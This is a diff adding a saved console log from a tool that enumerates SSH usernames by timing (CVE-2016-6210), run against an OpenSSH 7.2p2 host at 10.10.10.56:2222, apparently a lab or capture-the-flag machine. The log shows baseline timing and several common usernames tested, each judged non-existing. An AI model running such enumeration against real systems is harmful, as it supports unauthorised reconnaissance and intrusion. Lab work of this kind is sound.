@@ -1,0 +1,17 @@
+
+
+User name enumeration against SSH daemons affected by CVE-2016-6210
+Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari
+
+
+[94m[*] [0mTesting SSHD at: [1m10.10.10.56:2222[0m, Banner: [1mSSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2[0m
+[94m[*] [0mGetting baseline timing for authenticating non-existing users............
+[94m[*] [0mBaseline mean for host 10.10.10.56 is 0.02257189999999999 seconds.
+[94m[*] [0mBaseline variation for host 10.10.10.56 is 0.0017486826155709322 seconds.
+[93m[*] [0mDefining timing of x < 0.027817947846712786 as non-existing user.
+[94m[*] [0mTesting your users...
+[91m[-] [0mroot - timing: 0.02111699999999994
+[91m[-] [0msysop - timing: 0.024653999999999954
+[91m[-] [0madmin - timing: 0.021440999999999932
+[91m[-] [0madmnistrator - timing: 0.019411999999999985
+[91m[-] [0msuperuser - timing: 0.02144199999999996
